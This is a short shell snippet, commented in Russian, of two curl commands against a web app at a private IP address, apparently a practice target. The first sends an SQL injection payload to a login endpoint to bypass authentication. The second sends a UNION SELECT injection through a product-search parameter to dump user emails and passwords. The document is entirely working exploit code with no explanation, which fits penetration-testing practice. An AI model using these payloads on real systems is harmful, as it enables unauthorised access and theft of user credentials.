# SQLi: обход аутентификации
curl -X POST "http://172.20.0.106:3000/rest/user/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"

# SQLi: UNION SELECT через поиск товаров
curl -G "http://172.20.0.106:3000/rest/products/search" \
    --data-urlencode "q=')) UNION SELECT id,'2','3',email,password,'6','7','8','9' FROM users--"
